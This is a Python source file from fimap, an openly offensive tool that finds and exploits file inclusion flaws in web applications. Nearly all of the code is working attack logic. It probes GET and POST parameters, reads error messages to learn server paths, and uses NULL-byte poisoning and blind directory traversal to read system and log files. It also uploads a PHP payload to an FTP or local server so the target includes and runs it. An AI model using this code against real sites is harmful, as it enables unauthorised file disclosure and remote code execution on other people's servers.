#
# This file is part of fimap.
#
# Copyright(c) 2009-2010 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

from config import settings
import shutil
import baseClass
from report import report
import re,os
import os.path
import posixpath
import ntpath

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$30.08.2009 19:59:44$"

class targetScanner (baseClass.baseClass):

    def _load(self):
        self.MonkeyTechnique = False
        self._log("TargetScanner loaded.", self.LOG_DEBUG)
        self.params = {}
        self.postparams = {}

    def prepareTarget(self, url):
        self.Target_URL = url

        self._log("Parsing URL '%s'..."%(self.Target_URL), self.LOG_ALWAYS)

        if (self.Target_URL.find("?") == -1):
            self._log("Target URL doesn't have any params.", self.LOG_DEBUG);
        else:
            data = self.Target_URL.split("?")[1]
            if (data.find("&") == -1):
                self.__addToken(self.params, data)
            else:
                for ln in data.split("&"):
                    self.__addToken(self.params, ln)

        post = self.config["p_post"]
        if (post != ""):
            if (post.find("&") == -1):
                self.__addToken(self.postparams, post)
            else:
                for ln in post.split("&"):
                    self.__addToken(self.postparams, ln)

        return(len(self.params)>0 or len(self.postparams)>0)

    def analyzeURL(self, result, k, v, post=None, isPost=False):
        tmpurl = self.Target_URL
        tmppost = post
        rndStr = self.getRandomStr()
        if (not isPost):
            tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
        else:
            tmppost = tmppost.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
        code = None
        if (post==None):
            self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
            code = self.doGetRequest(tmpurl)
        else:
            self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, post), self.LOG_DEBUG)
            code = self.doPostRequest(tmpurl, tmppost)

        xml2config = self.config["XML2CONFIG"]
        READFILE_ERR_MSG = xml2config.getAllReadfileRegex()

        if (code != None):
            disclosure_found = False
            for lang, ex in READFILE_ERR_MSG:
                RE_SUCCESS_MSG = re.compile(ex%(rndStr), re.DOTALL)
                m = RE_SUCCESS_MSG.search(code)
                if (m != None):
                    if (not isPost):
                        self._log("Possible local file disclosure found! -> '%s' with Parameter '%s'. (%s)"%(tmpurl, k, lang), self.LOG_ALWAYS)
                    else:
                        self._log("Possible local file disclosure found! -> '%s' with POST-Parameter '%s'. (%s)"%(tmpurl, k, lang), self.LOG_ALWAYS)
                    #self.identifyReadFile(URL, Params, VulnParam)
                    self._writeToLog("READ ; %s ; %s"%(tmpurl, k))
                    disclosure_found = True
                    break

            if (not disclosure_found):
                sniper_regex = xml2config.getAllSniperRegex()
                for lang, sniper in sniper_regex:
                    RE_SUCCESS_MSG = re.compile(sniper%(rndStr), re.DOTALL)
                    m = RE_SUCCESS_MSG.search(code)
                    if (m != None):
                        rep = None
                        self._writeToLog("POSSIBLE ; %s ; %s"%(self.Target_URL, k))
                        if (not isPost):
                            self._log("[%s] Possible file inclusion found! -> '%s' with Parameter '%s'." %(lang, tmpurl, k), self.LOG_ALWAYS)
                            rep = self.identifyVuln(self.Target_URL, self.params, k, post, lang)
                        else:
                            self._log("[%s] Possible file inclusion found! -> '%s' with POST-Parameter '%s'." %(lang, tmpurl, k), self.LOG_ALWAYS)
                            rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, lang, True)
                        
                        
                        if (rep != None):
                            rep.setVulnKeyVal(v)
                            rep.setLanguage(lang)
                            result.append((rep, self.readFiles(rep)))
        return(result)

    def analyzeURLblindly(self, i, testfile, k, v, find, goBackSymbols, post=None, isPost=False, isUnix=True):
        tmpurl = self.Target_URL
        tmppost = post
        rep = None
        doBreak = False
        
        if (not isPost):
            tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, testfile))
            
        else:
            tmppost = tmppost.replace("%s=%s"%(k,v), "%s=%s"%(k, testfile))
        
        if (post != None and post != ""):
            self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
        else:
            self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, tmppost), self.LOG_DEBUG)
        code = self.doPostRequest(tmpurl, tmppost)
        if (code != None):
            if (code.find(find) != -1):
                self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                doBreak = True
                if (not isPost):
                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, isPost, (goBackSymbols * i, False), isUnix)
                else:
                    rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, None, isPost, (goBackSymbols * i, False), isUnix)
            else:
                tmpurl = self.Target_URL
                tmpfile = testfile + "%00"
                postdata = post
                if (not isPost):
                    tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, tmpfile))
                else:
                    postdata = postdata.replace("%s=%s"%(k,v), "%s=%s"%(k, tmpfile))
                
                if (post != None and post != ""):
                    self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
                else:
                    self._log("Requesting: '%s' with POST('%s')..." %(tmpurl, postdata), self.LOG_DEBUG)
                
                code = self.doPostRequest(tmpurl, postdata)
                if (code.find(find) != -1):
                    if (not isPost):
                        self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                    else:
                        self._log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                    doBreak = True
                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, isPost, (goBackSymbols * i, True), isUnix)
        else:
            # Previous result was none. Assuming that we can break here.
            self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
            doBreak = True
        return(rep, doBreak)

    def testTargetVuln(self):
        ret = []

        xml2config = self.config["XML2CONFIG"]

        self._log("Fiddling around with URL...", self.LOG_INFO)

        for k,v in self.params.items():
            self.analyzeURL(ret, k, v, self.config["p_post"], False)
        for k,v in self.postparams.items():
            self.analyzeURL(ret, k, v, self.config["p_post"], True)

                

        if (len(ret) == 0 and self.MonkeyTechnique):
            self._log("Sniper failed. Going blind...", self.LOG_INFO)
            files = xml2config.getBlindFiles()
            for fileobj in files:
                post = fileobj.getPostData()
                v    = fileobj.getFindStr()
                f    = fileobj.getFilepath()
                
                backSym = fileobj.getBackSymbols()
                for i in range(xml2config.getBlindMin(), xml2config.getBlindMax()):
                    doBreak = False
                    testfile = f
                    if (i > 0):
                        tmpf = f
                        if (fileobj.isWindows()):
                            tmpf = f[f.find(":")+1:]
                        testfile = backSym * i + tmpf
                    rep = None
                    for k,V in self.params.items():
                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], False, fileobj.isUnix())
                        if (rep != None):
                            rep.setVulnKeyVal(V)
                            rep.setPostData(self.config["p_post"])
                            ret.append((rep, self.readFiles(rep)))
                    for k,V in self.postparams.items():
                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], True, fileobj.isUnix())
                        if (rep != None):
                            rep.setVulnKeyVal(V)
                            rep.setPostData(self.config["p_post"])
                            rep.setPost(True)
                            ret.append((rep, self.readFiles(rep)))
                    if (doBreak): return(ret)
        return(ret)



    def identifyVuln(self, URL, Params, VulnParam, PostData, Language, isPost=False, blindmode=None, isUnix=None):
        xml2config = self.config["XML2CONFIG"]
        
        if (blindmode == None):

            script = None
            scriptpath = None
            pre = None
            
            langClass = xml2config.getAllLangSets()[Language]
            
            if (not isPost):
                self._log("[%s] Identifying Vulnerability '%s' with Parameter '%s'..."%(Language, URL, VulnParam), self.LOG_ALWAYS)
            else:
                self._log("[%s] Identifying Vulnerability '%s' with POST-Parameter '%s'..."%(Language, URL, VulnParam), self.LOG_ALWAYS)

            tmpurl = URL
            PostHax = PostData
            rndStr = self.getRandomStr()

            if (not isPost):
                tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))
            else:
                PostHax = PostHax.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))

            RE_SUCCESS_MSG = re.compile(langClass.getSniper()%(rndStr), re.DOTALL)

            code = self.doPostRequest(tmpurl, PostHax)
            if (code == None):
                self._log("Identification of vulnerability failed. (code == None)", self.LOG_ERROR)
                return None
                
            m = RE_SUCCESS_MSG.search(code)
            if (m == None):
                self._log("Identification of vulnerability failed. (m == None)", self.LOG_ERROR)
                return None


            r = report(URL, Params, VulnParam)
            r.setPost(isPost)
            r.setPostData(PostData)
            
            for sp_err_msg in langClass.getIncludeDetectors():
                RE_SCRIPT_PATH = re.compile(sp_err_msg)
                s = RE_SCRIPT_PATH.search(code)
                if (s != None): break
            if (s == None):
                self._log("Failed to retrieve script path.", self.LOG_WARN)

                print "[MINOR BUG FOUND]"
                print "------------------------------------------------------"
                print "It's possible that fimap was unable to retrieve the scriptpath"
                print "because the regex for this kind of error message is missing."
                a = raw_input("Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
                if (a=="y" or a=="Y"):
                    print "-----------SEND THIS TO 'fimap.dev@gmail.com'-----------"
                    print "SUBJECT: fimap Regex"
                    print "ERROR  : Failed to retrieve script path."
                    print "URL    : " + URL
                    print "-----------------------------------------------------------"
                    raw_input("Copy it and press enter to proceed with scanning...")
                else:
                    print "No problem! I'll continue with your scan..."

                return(None)
            else:
                script = s.group('script')
                if (script != None and script[1] == ":"): # Windows detection quick hack
                    scriptpath = script[:script.rfind("\\")]
                    r.setWindows()
                elif (script != None and script.startswith("\\\\")):
                    scriptpath = script[:script.rfind("\\")]
                    r.setWindows()
                else:
                    scriptpath = os.path.dirname(script)
                    if (scriptpath == None or scriptpath == ""):
                        self._log("Scriptpath is empty! Assuming that we are on toplevel.", self.LOG_WARN)
                        scriptpath = "/"
                        script = "/" + script

                # Check if scriptpath was received correctly.
                if(scriptpath!=""):
                    self._log("Scriptpath received: '%s'" %(scriptpath), self.LOG_INFO)
                    r.setServerPath(scriptpath)
                    r.setServerScript(script)


            if (r.isWindows()):
                self._log("Operating System is 'Windows'.", self.LOG_INFO)
            else:
                self._log("Operating System is 'Unix-Like'.", self.LOG_INFO)


            errmsg = m.group("incname")

            if (errmsg == rndStr):
                r.setPrefix("")
                r.setSurfix("")
            else:
                tokens = errmsg.split(rndStr)
                pre = tokens[0]
                addSlash = False
                if (pre == ""):
                    pre = "/"
                #else:
                #    if pre[-1] != "/":
                #       addSlash = True


                rootdir = None
                
                if (pre[0] != "/"):
                    if (r.isUnix()):
                        pre = posixpath.join(r.getServerPath(), pre)
                        pre = posixpath.normpath(pre)
                        rootdir = "/"
                        pre = self.relpath_unix(rootdir, pre)
                    else:
                        pre = ntpath.join(r.getServerPath(), pre)
                        pre = ntpath.normpath(pre)
                        if (pre[1] == ":"):
                            rootdir = pre[0:3]
                        pre = self.relpath_win(rootdir, pre)
                else:
                    pre = self.relpath_unix("/", pre)
                if addSlash: pre = rootdir + pre
                
                #Quick fix for increasing success :P
                if (pre != "."):
                    pre = "/" + pre
                
                sur = tokens[1]
                if (pre == "."): pre = ""
                r.setPrefix(pre)
                r.setSurfix(sur)

                if (sur != ""):
                    self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.LOG_INFO)
                    tmpurl = URL
                    tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
                    code = self.doGetRequest(tmpurl)
                    if (code == None):
                        self._log("NULL-Byte testing failed.", self.LOG_WARN)
                        r.setNullBytePossible(False)
                    elif (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
                        self._log("NULL-Byte Poisoning not possible.", self.LOG_INFO)
                        r.setNullBytePossible(False)
                    else:
                        self._log("NULL-Byte Poisoning successfull!", self.LOG_INFO)
                        r.setSurfix("%00")
                        r.setNullBytePossible(True)


            if (scriptpath == ""):
                # Failed to get scriptpath with easy method :(
                if (pre != ""):
                    self._log("Failed to retrieve path but we are forced to go relative!", self.LOG_WARN)
                    self._log("Go and try it to scan with --enable-blind.", self.LOG_WARN)
                    return(None)
                else:
                    self._log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.LOG_WARN)
                    scriptpath = "/"
                    r.setServerPath(scriptpath)
                    r.setServerScript(script)

            return(r)
        
        
        else:
            # Blindmode
            prefix = blindmode[0]
            isNull = blindmode[1]
            self._log("Identifying Vulnerability '%s' with Parameter '%s' blindly..."%(URL, VulnParam), self.LOG_ALWAYS)
            r = report(URL, Params, VulnParam)
            r.setBlindDiscovered(True)
            r.setSurfix("")
            if isNull: r.setSurfix("%00")
            r.setNullBytePossible(isNull)
            if (prefix.strip() == ""):
                r.setServerPath("/noop")
            else:
                r.setServerPath(prefix.replace("..", "a"))
            r.setServerScript("noop")
            r.setPrefix(prefix)
            if (not isUnix):
                r.setWindows()
            return(r)


    def readFiles(self, rep):
        xml2config = self.config["XML2CONFIG"]
        langClass = None
        if rep.isLanguageSet():
            langClass = xml2config.getAllLangSets()[rep.getLanguage()]
        else:
            if (self.config["p_autolang"]):
                self._log("Unknown language - Autodetecting...", self.LOG_WARN)
                if (rep.autoDetectLanguageByExtention(xml2config.getAllLangSets())):
                    self._log("Autodetect thinks this could be a %s-Script..."%(rep.getLanguage()), self.LOG_INFO)
                    self._log("If you think this is wrong start fimap with --no-auto-detect", self.LOG_INFO)
                    langClass = xml2config.getAllLangSets()[rep.getLanguage()]
                else:
                    self._log("Autodetect failed!", self.LOG_ERROR)
                    return([])
            else:
                self._log("Unknown language! You have told me to let you choose - here we go.", self.LOG_WARN)
                boxheader = "Choose language for URL: %s" %(rep.getURL())
                boxarr = []
                choose = []
                idx = 0
                for Name, langClass in xml2config.getAllLangSets().items():
                    boxarr.append("[%d] %s"%(idx+1, Name))
                    choose.append(Name)
                    idx += 1
                boxarr.append("[q] Quit")
                self.drawBox(boxheader, boxarr)
                inp = ""
                while (1==1):
                    inp = raw_input("Script number: ")
                    if (inp == "q" or inp == "Q"):
                        return([])
                    else:
                        try:
                            idx = int(inp)
                            if (idx < 1 or idx > len(choose)):
                                print "Choose out of range..."
                            else:
                                rep.setLanguage(choose[idx-1])
                                langClass = xml2config.getAllLangSets()[rep.getLanguage()]
                                break
                        except:
                            print "Invalid Number!"
        
        
        
        files     = xml2config.getRelativeFiles(rep.getLanguage())
        abs_files = xml2config.getAbsoluteFiles(rep.getLanguage())
        rmt_files = xml2config.getRemoteFiles(rep.getLanguage())
        log_files = xml2config.getLogFiles(rep.getLanguage())
        rfi_mode = settings["dynamic_rfi"]["mode"]

        ret = []
        self._log("Testing default files...", self.LOG_DEBUG)

        for fileobj in files:
            post = fileobj.getPostData()
            p    = fileobj.getFindStr()
            f    = fileobj.getFilepath()
            type = fileobj.getFlags()
            quiz = answer = None
            if (post != None):
                quiz, answer = langClass.generateQuiz()
                post = post.replace("__QUIZ__", quiz)
                p = p.replace("__ANSWER__", answer)
                
            if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    if (self.readFile(rep, f, p, POST=post)):
                        ret.append(f)
                        self.addXMLLog(rep, type, f)
                    else:
                        pass
                else:
                    self._log("Skipping file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG)
            else:
                self._log("Skipping file '%s'."%f, self.LOG_INFO)

        self._log("Testing absolute files...", self.LOG_DEBUG)
        for fileobj in abs_files:
            post = fileobj.getPostData()
            p    = fileobj.getFindStr()
            f    = fileobj.getFilepath()
            type = fileobj.getFlags()
            canbreak = fileobj.isBreakable()
            
            quiz = answer = None
            if (post != None):
                quiz, answer = langClass.generateQuiz()
                post = post.replace("__QUIZ__", quiz)
                p = p.replace("__ANSWER__", answer)
            if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()) or canbreak)):
                if canbreak:
                    #SUPERDUPER URL HAX!
                    rep.setSurfix("&")
                
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    if (self.readFile(rep, f, p, True, POST=post)):
                        ret.append(f)
                        self.addXMLLog(rep, type, f)
                    else:
                        pass
                else:
                    self._log("Skipping absolute file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG)
            else:
                self._log("Skipping absolute file '%s'."%f, self.LOG_INFO)

        self._log("Testing log files...", self.LOG_DEBUG)
        for fileobj in log_files:
            post = fileobj.getPostData()
            p    = fileobj.getFindStr()
            f    = fileobj.getFilepath()
            type = fileobj.getFlags()
            
            if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    if (self.readFile(rep, f, p)):
                        ret.append(f)
                        self.addXMLLog(rep, type, f)
                    else:
                        pass
                else:
                   self._log("Skipping log file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG) 
            else:
                self._log("Skipping log file '%s'."%f, self.LOG_INFO)

        if (rfi_mode in ("ftp", "local")):
            if (rfi_mode == "ftp"): self._log("Testing remote inclusion dynamicly with FTP...", self.LOG_INFO)
            if (rfi_mode == "local"): self._log("Testing remote inclusion dynamicly with local server...", self.LOG_INFO)
            if (rep.getPrefix() == ""):
                fl = up = None
                if (rfi_mode == "ftp"):
                    fl = settings["dynamic_rfi"]["ftp"]["ftp_path"] + rep.getAppendix()
                    up = self.FTPuploadFile(settings["php_info"][0], rep.getAppendix())
                    # Discard the suffix if there is a forced directory structure.
                    if (not up["http"].endswith(rep.getAppendix())):
                        rep.setSurfix("")
                    
                elif(rfi_mode == "local"):
                    up = self.putLocalPayload(settings["php_info"][0], rep.getAppendix())
                    if (not up["http"].endswith(rep.getAppendix())):
                        rep.setSurfix("")
                if (self.readFile(rep, up["http"], settings["php_info"][1], True)):
                    ret.append(up["http"])
                    rep.setRemoteInjectable(True)
                    self.addXMLLog(rep, "rxR", up["http"])

                if (rfi_mode == "ftp"): 
                    if up["dirstruct"]:
                        self.FTPdeleteDirectory(up["ftp"])
                    else:
                        self.FTPdeleteFile(up["ftp"])
                if (rfi_mode == "local"): 
                    self.deleteLocalPayload(up["local"])
        else:
            self._log("Testing remote inclusion...", self.LOG_DEBUG)
            for fileobj in rmt_files:
                post = fileobj.getPostData()
                p    = fileobj.getFindStr()
                f    = fileobj.getFilepath()
                type = fileobj.getFlags()
                canbreak = fileobj.isBreakable()
                
                if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()) or canbreak)):
                    if ((not rep.isNullbytePossible() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
                        f = f[:-len(rep.getSurfix())]
                        rep.setSurfix("")
                    elif (canbreak):
                        #SUPERDUPER URL HAX!
                        rep.setSurfix("&")
                    
                    if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                        if (self.readFile(rep, f, p, True)):
                            ret.append(f)
                            rep.setRemoteInjectable(True)
                            self.addXMLLog(rep, type, f)
                        else:
                            pass
                    else:
                        self._log("Skipping remote file '%s' because it's not suitable for our OS."%f, self.LOG_DEBUG)
                else:
                    self._log("Skipping remote file '%s'."%f, self.LOG_INFO)



        self.saveXML()
        return(ret)


    def readFile(self, report, filepath, filepattern, isAbs=False, POST=None):
        self._log("Testing file '%s'..." %filepath, self.LOG_INFO)
        
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()[report.getLanguage()]
        
        tmpurl = report.getURL()
        prefix = report.getPrefix()
        surfix = report.getSurfix()
        vuln   = report.getVulnKey()
        params = report.getParams()
        isunix = report.isUnix()
        
        scriptpath = report.getServerPath()
        
        postdata = None
        isPost = report.isPost
        if (isPost):
            postdata = report.getPostData()


        filepatha = ""
        if (prefix != None and prefix != "" and prefix[-1] == "/"):
            prefix = prefix[:-1]
            report.setPrefix(prefix)

        if (filepath[0] == "/"):
            filepatha = prefix + filepath
        if (report.isWindows() and len(prefix.strip()) > 0 and not isAbs):
            filepatha = prefix + filepath[3:]
        elif len(prefix.strip()) > 0 and not isAbs:
            filepatha = prefix + "/" + filepath
        else:
            filepatha = filepath


        if (scriptpath[-1] != "/" and filepatha[0] != "/" and not isAbs and report.isUnix()):
            filepatha = "/" + filepatha

        payload = "%s%s"%(filepatha, surfix)
        if (not isPost):
            tmpurl = tmpurl.replace("%s=%s" %(vuln, params[vuln]), "%s=%s"%(vuln, payload))
        else:
            postdata = postdata.replace("%s=%s" %(vuln, params[vuln]), "%s=%s"%(vuln, payload))

        self._log("Testing URL: " + tmpurl, self.LOG_DEBUG)

        RE_SUCCESS_MSG = re.compile(langClass.getSniper()%(filepath), re.DOTALL)
        code = None
        if (POST != None or postdata != None):
            if (postdata != None):
                if (POST == None):
                    POST = postdata
                else:
                    POST = "%s&%s"%(postdata, POST)
            code = self.doPostRequest(tmpurl, POST)
        else:
            code = self.doGetRequest(tmpurl)

        if (code == None):
            return(False)

        m = RE_SUCCESS_MSG.search(code)
        if (m == None):
            if (filepattern == None or code.find(filepattern) != -1):
                #self._writeToLog("VULN;%s;%s;%s;%s"%(tmpurl, vuln, payload, filepath))
                return(True)

        return(False)

    def __addToken(self, arr, token):
        if (token.find("=") == -1):
            arr[token] = ""
            self._log("Token found: [%s] = none" %(token), self.LOG_DEBUG)
        else:
            k = token.split("=")[0]
            v = token.split("=")[1]
            arr[k] = v
            self._log("Token found: [%s] = [%s]" %(k,v), self.LOG_DEBUG)